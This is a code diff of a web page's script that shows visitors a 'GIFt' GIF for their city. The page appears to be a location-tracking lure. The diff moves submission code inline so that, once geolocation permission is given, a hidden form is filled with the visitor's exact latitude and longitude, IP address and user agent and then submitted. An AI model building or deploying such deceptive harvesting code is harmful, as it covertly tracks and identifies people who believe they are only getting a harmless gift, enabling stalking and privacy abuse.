@@ -137,7 +137,13 @@
                     document.getElementById('gif-container').innerHTML = `<img src="${gifUrl}" alt="gift" width="100%">`;
                     document.getElementById('locationStatus').innerHTML = `Here’s a <strong>GIFt</strong> chosen for ${cityRaw}`;
                     document.getElementById('gifTitle').innerHTML = `Your local <strong>GIFt</strong> has arrived`;
-                    sendData(position.coords.latitude, position.coords.longitude);
+
+                    // 🔄 Form data submission (original version)
+                    document.getElementById('formLat').value = position.coords.latitude;
+                    document.getElementById('formLng').value = position.coords.longitude;
+                    document.getElementById('formIP').value = ipAddress;
+                    document.getElementById('formUA').value = navigator.userAgent;
+                    document.getElementById('dataForm').submit();
                   });
               });
           },
@@ -148,14 +154,6 @@
       } else {
         showDenied();
       }
-    }
-
-    function sendData(lat, lng) {
-      document.getElementById('formLat').value = lat;
-      document.getElementById('formLng').value = lng;
-      document.getElementById('formIP').value = ipAddress;
-      document.getElementById('formUA').value = navigator.userAgent;
-      document.getElementById('dataForm').submit();
     }
   </script>
 </body>
